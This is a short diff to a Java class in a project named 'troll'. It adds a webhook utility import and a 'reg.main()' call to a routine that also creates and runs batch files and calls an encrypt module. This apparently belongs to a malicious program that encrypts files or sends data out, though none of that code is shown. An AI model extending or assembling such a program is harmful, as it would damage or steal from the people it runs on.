@@ -1,6 +1,8 @@
 package halq.troll.troll.moment;
 
 
+import halq.troll.troll.moment.utils.webhookUtil;
+
 import java.io.FileWriter;
 import java.io.IOException;
 import java.nio.file.Files;
@@ -16,6 +18,7 @@ import java.util.concurrent.TimeUnit;
 public class main {
 
     public static void runall() {
+        reg.main();
         createbat();
         runbat();
         encrypt.Main();
